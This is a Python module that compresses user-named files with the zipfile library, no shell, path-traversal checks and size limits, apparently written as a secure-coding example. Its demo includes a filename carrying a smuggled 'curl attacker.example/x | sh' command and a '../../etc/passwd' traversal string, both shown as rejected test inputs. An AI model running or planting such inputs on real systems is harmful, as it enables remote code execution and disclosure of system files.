# Write secure code to compress files that safely utilizes standard programmatic compression libraries without invoking the system shell 

"""
secure_compress.py
-------------------
A safe file-compression routine.

Design principles:
  1. No shell is ever invoked. Compression is done with Python's
     built-in `zipfile` module, which reads and writes files directly
     via the filesystem API — there is no command string to build and
     therefore nothing for untrusted filenames to inject into.
  2. Filenames are still treated as untrusted: each one is validated
     and resolved to an absolute path that must live inside an
     explicitly allowed base directory before it's touched, guarding
     against path traversal (e.g. "../../etc/passwd") even though
     shell injection itself is no longer possible.
  3. Files are stored in the archive under a safe, traversal-free
     archive name (basename only), so extracting the resulting zip
     later can't escape its target directory either.
  4. Size limits guard against zip-bomb-style resource exhaustion
     (both on the way in and, as a note, on the way out).
  5. Errors for individual bad files are collected and reported rather
     than silently skipped or allowed to abort the whole batch.
"""

from __future__ import annotations

import logging
import zipfile
from dataclasses import dataclass, field
from pathlib import Path

logger = logging.getLogger("secure_compress")
logger.setLevel(logging.INFO)
if not logger.handlers:
    _h = logging.StreamHandler()
    _h.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    logger.addHandler(_h)

# Reject any single input file larger than this (defense against
# resource-exhaustion / zip-bomb-adjacent abuse). Adjust to your needs.
MAX_INPUT_FILE_BYTES = 200 * 1024 * 1024  # 200 MB


class CompressionError(Exception):
    pass


@dataclass
class CompressionResult:
    archive_path: Path
    included: list[str] = field(default_factory=list)
    skipped: list[tuple[str, str]] = field(default_factory=list)  # (name, reason)


def _resolve_within_base(base_dir: Path, filename: str) -> Path | None:
    """Resolve `filename` relative to `base_dir` and confirm the result
    is actually inside `base_dir`. Returns None (and does not raise) if
    the filename is invalid or attempts to escape the base directory —
    callers should treat that as "skip this file", not "abort"."""
    # Reject filenames that are absolute or contain no name component.
    candidate = Path(filename)
    if candidate.is_absolute():
        return None

    try:
        resolved = (base_dir / candidate).resolve()
    except (OSError, ValueError):
        return None

    try:
        resolved.relative_to(base_dir.resolve())
    except ValueError:
        # Path traversal attempt (e.g. "../../etc/passwd") — reject.
        return None

    return resolved


def compress_files(
    base_dir: str | Path,
    filenames: list[str],
    archive_path: str | Path,
) -> CompressionResult:
    """Compress a set of user-supplied filenames into a zip archive.

    `base_dir` is the trusted root directory these files are expected to
    live in (e.g. a per-user upload folder). `filenames` are untrusted
    strings as supplied by the caller (e.g. from a request body) — they
    are validated, never passed to a shell.

    Files that fail validation (missing, too large, outside base_dir,
    not a regular file) are skipped and reported in the result rather
    than aborting the whole operation or, worse, being silently
    executed as part of a command.
    """
    base = Path(base_dir).resolve()
    if not base.is_dir():
        raise CompressionError(f"Base directory does not exist: {base}")

    out_path = Path(archive_path)
    result = CompressionResult(archive_path=out_path)

    # zipfile writes directly via the filesystem API — no shell, no
    # subprocess, no command string of any kind is constructed.
    with zipfile.ZipFile(out_path, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name in filenames:
            resolved = _resolve_within_base(base, name)

            if resolved is None:
                logger.warning("Skipping invalid/out-of-bounds filename: %r", name)
                result.skipped.append((name, "invalid or outside base directory"))
                continue

            if not resolved.is_file():
                logger.warning("Skipping missing/non-regular file: %r", name)
                result.skipped.append((name, "not a regular file"))
                continue

            size = resolved.stat().st_size
            if size > MAX_INPUT_FILE_BYTES:
                logger.warning("Skipping oversized file: %r (%d bytes)", name, size)
                result.skipped.append((name, f"exceeds size limit ({size} bytes)"))
                continue

            # Store under just the basename inside the archive so that,
            # if extracted later, entries can't traverse outside the
            # extraction directory either.
            arcname = resolved.name
            zf.write(resolved, arcname=arcname)
            result.included.append(arcname)

    logger.info(
        "Compression complete: %s (%d files included, %d skipped)",
        out_path, len(result.included), len(result.skipped),
    )
    return result


if __name__ == "__main__":
    # Demonstration with a temp directory and a mix of safe and
    # malicious-looking filenames.
    import tempfile

    with tempfile.TemporaryDirectory() as tmp:
        base = Path(tmp)
        (base / "notes.txt").write_text("hello")
        (base / "receipts.txt").write_text("world")

        requested = [
            "notes.txt",
            "receipts.txt; curl attacker.example/x | sh",  # inert here: never touches a shell
            "../../etc/passwd",                             # traversal attempt, rejected
            "does_not_exist.txt",                            # missing file, skipped
        ]

        archive = base / "archive.zip"
        outcome = compress_files(base, requested, archive)

        print(f"Included: {outcome.included}")
        print(f"Skipped: {outcome.skipped}")
        print(f"Archive members: {zipfile.ZipFile(archive).namelist()}")